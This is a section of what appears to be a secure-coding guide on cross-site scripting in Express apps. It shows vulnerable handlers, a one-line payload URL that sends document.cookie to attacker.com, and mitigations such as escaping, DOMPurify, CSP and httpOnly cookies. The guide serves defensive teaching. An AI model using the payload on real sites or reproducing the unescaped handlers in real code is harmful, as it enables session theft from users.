## 2. Cross-Site Scripting (XSS)

### Vulnerability Description
Attackers inject malicious scripts that execute in users' browsers, stealing session tokens, cookies, or sensitive data.

### Examples

**Vulnerable Code:**
```javascript
// Reflected XSS
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`); // Unsanitized output
});

// Stored XSS
app.post('/comment', (req, res) => {
  const comment = req.body.text;
  db.save({ comment: comment }); // No sanitization
  res.send(`<p>${comment}</p>`); // Rendered without escaping
});
```

**Attack Example:**
```
URL: /search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

### Mitigation Strategies

**1. Use Template Engines with Auto-Escaping:**
```javascript
// Using EJS with auto-escaping (enabled by default)
app.set('view engine', 'ejs');

// Template file
<div><%= userComment %></div> <!-- Automatically escaped -->
```

**2. HTML Entity Encoding:**
```javascript
const xss = require('xss');
const DOMPurify = require('isomorphic-dompurify');

app.get('/search', (req, res) => {
  const query = xss(req.query.q); // Sanitize input
  res.render('results', { query: query });
});

// Or use DOMPurify
const clean = DOMPurify.sanitize(userInput);
```

**3. Content Security Policy (CSP):**
```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "trusted-cdn.com"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  },
}));
```

**4. HTTPOnly and Secure Cookies:**
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: {
    httpOnly: true,     // Prevents JavaScript access
    secure: true,       // Only sent over HTTPS
    sameSite: 'strict'  // CSRF protection
  }
}));
```

